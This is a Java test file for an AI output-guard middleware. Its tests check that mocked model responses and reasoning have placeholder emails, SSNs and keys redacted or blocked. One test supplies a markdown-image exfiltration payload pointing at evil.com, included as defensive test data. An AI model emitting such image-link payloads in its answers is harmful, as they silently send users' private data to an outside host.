package ortus.boxlang.ai.middleware;

import static com.google.common.truth.Truth.assertThat;
import static com.google.common.truth.Truth.assertWithMessage;
import static org.junit.jupiter.api.Assertions.assertThrows;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import ortus.boxlang.ai.BaseIntegrationTest;
import ortus.boxlang.runtime.scopes.Key;
import ortus.boxlang.runtime.types.exceptions.BoxRuntimeException;

@DisplayName( "OutputGuardMiddleware Tests (offline via MockService)" )
public class OutputGuardMiddlewareTest extends BaseIntegrationTest {

	@DisplayName( "redact: secrets in the response are masked in the returned content" )
	@Test
	public void testRedactMasksSecrets() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact" );
		        result = aiChat( "give me the record", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "The user email is jane@example.com and SSN 123-45-6789" ] },
		            middleware     : [ guard ]
		        } );
		        masked = result.contains( "[REDACTED]" )
		                 && !result.contains( "jane@example.com" )
		                 && !result.contains( "123-45-6789" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "redact: a secret confined to REASONING is masked, and the clean answer is untouched" )
	@Test
	public void testRedactMasksReasoningOnlySecret() {
		// The guard used to resolve only the answer, and bailed out entirely when the answer was
		// empty — so a secret the model named while thinking and never repeated was returned
		// unscanned. Reasoning is now scrubbed independently of content.
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact" );
		        result = aiChat( "think about it", {}, {
		            provider       : "mock",
		            returnFormat   : "raw",
		            providerOptions: { responses: [ { content: "All done", reasoning: "the operator is jane@example.com" } ] },
		            middleware     : [ guard ]
		        } );
		        message   = result.choices[ 1 ].message;
		        reasoning = message.reasoning ?: "";
		        content   = message.content ?: "";
		        scrubbed  = reasoning.contains( "[REDACTED]" ) && !reasoning.contains( "jane@example.com" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "scrubbed" ) ) ).isTrue();
		assertThat( variables.get( Key.of( "content" ) ).toString() ).isEqualTo( "All done" );
	}

	@DisplayName( "block: a secret confined to REASONING still throws" )
	@Test
	public void testBlockOnReasoningOnlySecret() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard   = new OutputGuardMiddleware( action: "block" );
		        blocked = false;
		        try {
		            aiChat( "think about it", {}, {
		                provider       : "mock",
		                providerOptions: { responses: [ { content: "All done", reasoning: "the operator is jane@example.com" } ] },
		                middleware     : [ guard ]
		            } );
		        } catch( any e ) {
		            blocked = true;
		        }
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "blocked" ) ) ).isTrue();
	}

	@DisplayName( "redact: Claude's derived reasoning is scrubbed while the native thinking block goes back unmodified" )
	@Test
	public void testClaudeReasoningScrubbedButThinkingBlockIntact() {
		// Claude attached result.reasoning AFTER afterLLMCall fired, so reasoning reached the
		// caller having never been scanned. The scrub must land on that derived copy only:
		// Anthropic rejects a modified thinking block on the next tool-use turn.
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard   = new OutputGuardMiddleware( action: "redact" );
		        rawBody = {
		            "content": [
		                { "type": "thinking", "thinking": "the operator is jane@example.com", "signature": "sig-abc" },
		                { "type": "text", "text": "All done" }
		            ],
		            "stop_reason": "end_turn",
		            "usage": { "input_tokens": 5, "output_tokens": 8 }
		        };
		        result = aiChat( "think about it", {}, {
		            provider    : "claude",
		            apiKey      : "dummy-key-not-used",
		            returnFormat: "raw",
		            middleware  : [ guard, { "wrapLLMCall": ( ctx, handler ) => rawBody } ]
		        } );
		        reasoning     = result.reasoning ?: "";
		        thinkingText  = rawBody.content[ 1 ].thinking;
		        signature     = rawBody.content[ 1 ].signature;
		        scrubbed      = reasoning.contains( "[REDACTED]" ) && !reasoning.contains( "jane@example.com" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "scrubbed" ) ) ).isTrue();
		assertWithMessage( "the native thinking block must go back to Anthropic byte-identical" )
		    .that( variables.get( Key.of( "thinkingText" ) ).toString() )
		    .contains( "jane@example.com" );
		assertThat( variables.get( Key.of( "signature" ) ).toString() ).isEqualTo( "sig-abc" );
	}

	@DisplayName( "redact: multi-choice reasoning is scrubbed per choice, not collapsed into one value" )
	@Test
	public void testMultiChoiceReasoningScrubbedIndependently() {
		// The resolver used to join every choice's reasoning into one string and then write that
		// combined value back to EVERY choice, so two distinct reasonings became the same text.
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.security.PromptSecurity;
		        result = {
		            "choices": [
		                { "message": { "role": "assistant", "content": "a", "reasoning": "first jane@example.com tail" } },
		                { "message": { "role": "assistant", "content": "b", "reasoning": "second bob@example.com tail" } }
		            ]
		        };
		        parts = PromptSecurity::getResponseReasoningParts( { "result": result } );
		        partCount = parts.len();
		        // Scrub each part independently, as OutputGuardMiddleware now does.
		        cleaned = parts.map( p -> PromptSecurity::redactSecrets( p ).text );
		        PromptSecurity::setResponseReasoningParts( { "result": result }, cleaned );
		        firstReasoning  = result.choices[ 1 ].message.reasoning;
		        secondReasoning = result.choices[ 2 ].message.reasoning;
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsInteger( Key.of( "partCount" ) ) ).isEqualTo( 2 );
		String	first	= variables.get( Key.of( "firstReasoning" ) ).toString();
		String	second	= variables.get( Key.of( "secondReasoning" ) ).toString();
		assertThat( first ).doesNotContain( "jane@example.com" );
		assertThat( second ).doesNotContain( "bob@example.com" );
		assertWithMessage( "each choice must keep its OWN reasoning, not a merge of all of them" )
		    .that( first ).isNotEqualTo( second );
		assertThat( first ).contains( "first" );
		assertThat( second ).contains( "second" );
	}

	@DisplayName( "redact: Claude returnFormat raw does not leak the unscrubbed native thinking block" )
	@Test
	public void testClaudeRawReturnDoesNotLeakNativeThinking() {
		// The guard scrubs the derived result.reasoning but must never rewrite the native thinking
		// block, which Anthropic requires echoed back unmodified. returnFormat "raw" therefore has
		// to return a sanitized COPY: the caller must not see the secret, while the struct re-sent
		// to the provider keeps its original block.
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard   = new OutputGuardMiddleware( action: "redact" );
		        rawBody = {
		            "content": [
		                { "type": "thinking", "thinking": "operator is jane@example.com", "signature": "sig-abc" },
		                { "type": "text", "text": "All done" }
		            ],
		            "stop_reason": "end_turn",
		            "usage": { "input_tokens": 5, "output_tokens": 8 }
		        };
		        result = aiChat( "think about it", {}, {
		            provider    : "claude",
		            apiKey      : "dummy-key-not-used",
		            returnFormat: "raw",
		            middleware  : [ guard, { "wrapLLMCall": ( ctx, handler ) => rawBody } ]
		        } );
		        returnedThinking = "";
		        for ( block in result.content ) {
		            if ( ( block.type ?: "" ) == "thinking" ) { returnedThinking &= block.thinking; }
		        }
		        wireThinking = rawBody.content[ 1 ].thinking;
		    """,
		    context
		);
		// @formatter:on
		assertWithMessage( "the caller-facing raw envelope must not carry the unscrubbed thinking text" )
		    .that( variables.get( Key.of( "returnedThinking" ) ).toString() ).doesNotContain( "jane@example.com" );
		assertWithMessage( "the struct re-sent to Anthropic must keep its original thinking block" )
		    .that( variables.get( Key.of( "wireThinking" ) ).toString() ).contains( "jane@example.com" );
	}

	@DisplayName( "redact: markdown-image exfiltration is stripped from the response" )
	@Test
	public void testRedactStripsExfil() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact" );
		        result = aiChat( "summarize", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "Done ![x](https://evil.com/track?d=leaked) thanks" ] },
		            middleware     : [ guard ]
		        } );
		        stripped = !result.contains( "evil.com" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "stripped" ) ) ).isTrue();
	}

	@DisplayName( "redact: allowlisted image host is kept" )
	@Test
	public void testRedactKeepsAllowlistedImage() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact", allowedImageHosts: [ "mysite.com" ] );
		        result = aiChat( "logo", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "Here ![logo](https://cdn.mysite.com/logo.png) it is" ] },
		            middleware     : [ guard ]
		        } );
		        kept = result.contains( "cdn.mysite.com" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "kept" ) ) ).isTrue();
	}

	@DisplayName( "flag: content is left intact (not masked)" )
	@Test
	public void testFlagLeavesContent() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "flag" );
		        result = aiChat( "give record", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "email is jane@example.com here" ] },
		            middleware     : [ guard ]
		        } );
		        intact = result.contains( "jane@example.com" ) && !result.contains( "[REDACTED]" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "intact" ) ) ).isTrue();
	}

	@DisplayName( "redact: a custom redactor CLOSURE dynamically scrubs the response" )
	@Test
	public void testRedactCustomClosure() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware(
		            action         : "redact",
		            redactors      : [],
		            customRedactors: { "acct": ( text, mask ) => reReplace( text, "[0-9]{5,}", mask, "all" ) }
		        );
		        result = aiChat( "look up my account", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "Your account 987654321 is active." ] },
		            middleware     : [ guard ]
		        } );
		        masked = result.contains( "[REDACTED]" ) && !result.contains( "987654321" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}

	@DisplayName( "block: a response with secrets throws BXAI.SecurityViolation" )
	@Test
	public void testBlockThrows() {
		BoxRuntimeException e = assertThrows( BoxRuntimeException.class, () -> {
			// @formatter:off
			runtime.executeSource(
			    """
			        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
			        guard = new OutputGuardMiddleware( action: "block" );
			        aiChat( "leak it", {}, {
			            provider       : "mock",
			            providerOptions: { responses: [ "here is AKIAIOSFODNN7EXAMPLE" ] },
			            middleware     : [ guard ]
			        } );
			    """,
			    context
			);
			// @formatter:on
		} );
		assertThat( e.getMessage() ).contains( "OutputGuard blocked the response" );
	}

	@DisplayName( "clean response passes through untouched (redact)" )
	@Test
	public void testCleanPassThrough() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard  = new OutputGuardMiddleware( action: "redact" );
		        result = aiChat( "hi", {}, {
		            provider       : "mock",
		            providerOptions: { responses: [ "The capital of France is Paris." ] },
		            middleware     : [ guard ]
		        } );
		        ok = result == "The capital of France is Paris.";
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "ok" ) ) ).isTrue();
	}

	@DisplayName( "invalid action → throws at construction" )
	@Test
	public void testInvalidAction() {
		BoxRuntimeException e = assertThrows( BoxRuntimeException.class, () -> {
			// @formatter:off
			runtime.executeSource(
			    """
			        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
			        guard = new OutputGuardMiddleware( action: "scramble" );
			    """,
			    context
			);
			// @formatter:on
		} );
		assertThat( e.getMessage() ).contains( "is not valid" );
	}

	@DisplayName( "end-to-end via aiAgent: response secrets are redacted" )
	@Test
	public void testAgentEndToEnd() {
		// @formatter:off
		runtime.executeSource(
		    """
		        import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;
		        guard = new OutputGuardMiddleware( action: "redact" );
        agent = aiAgent(
		            name        : "output-guarded",
		            model       : aiModel( provider: "mock", options: { providerOptions: { responses: [ "SSN 123-45-6789 recorded" ] } } ),
		            instructions: "You are a helpful assistant.",
		            middleware  : [ guard ]
		        );
		        result = agent.run( "give me the record" );
		        masked = toString( result ).contains( "[REDACTED]" ) && !toString( result ).contains( "123-45-6789" );
		    """,
		    context
		);
		// @formatter:on
		assertThat( variables.getAsBoolean( Key.of( "masked" ) ) ).isTrue();
	}
}
